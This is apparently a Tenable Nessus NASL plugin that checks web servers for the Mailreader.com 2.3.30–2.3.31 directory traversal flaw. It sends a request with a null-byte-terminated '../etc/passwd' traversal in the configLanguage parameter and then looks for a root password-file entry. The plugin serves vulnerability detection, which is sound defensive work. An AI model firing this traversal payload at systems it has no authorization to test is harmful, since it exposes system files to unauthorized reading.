#
# (C) Tenable Network Security, Inc.
#

# References:
# Date: Mon, 28 Oct 2002 17:48:04 +0800
# From: "pokleyzz" <pokleyzz@scan-associates.net>
# To: "bugtraq" <bugtraq@securityfocus.com>, 
#  "Shaharil Abdul Malek" <shaharil@scan-associates.net>, 
#  "sk" <sk@scan-associates.net>, "pokley" <saleh@scan-associates.net>, 
#  "Md Nazri Ahmad" <nazri@ns1.scan-associates.net> 
# Subject: SCAN Associates Advisory : Multiple vurnerabilities on mailreader.com
#


include("compat.inc");

if(description)
{
  script_id(11780);
  script_version("$Revision: 1.15 $");
  script_cve_id("CVE-2002-1581", "CVE-2002-1582");
  script_bugtraq_id(5393, 6055, 6058);
  script_xref(name:"OSVDB", value:"8192");
  script_xref(name:"OSVDB", value:"16018");

  script_name(english:"Mailreader 2.3.30 - 2.3.31 Multiple Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to access arbitrary file on the remote host." );
 script_set_attribute(attribute:"description", value:
"Mailreader.com software is installed. A directory traversal flaw 
allows anybody to read arbitrary files on your system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to v2.3.32 or later" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();


  script_summary(english:"Checks directory traversal & version number of mailreader.com software");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");
  script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(! get_port_state(port)) exit(0);

foreach dir (make_list(cgi_dirs()))
{
  r = http_get(port: port, item: strcat(dir, "/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00"));
  r2 =  http_keepalive_send_recv(port: port, data: r);
  if (isnull(r2)) exit(0);	# Dead server
  
  if ("Powered by Mailreader.com" >< r2 && r2 =~ "root:[^:]*:0:[01]:")
  {
   security_warning(port);
   exit(0);
  }
}

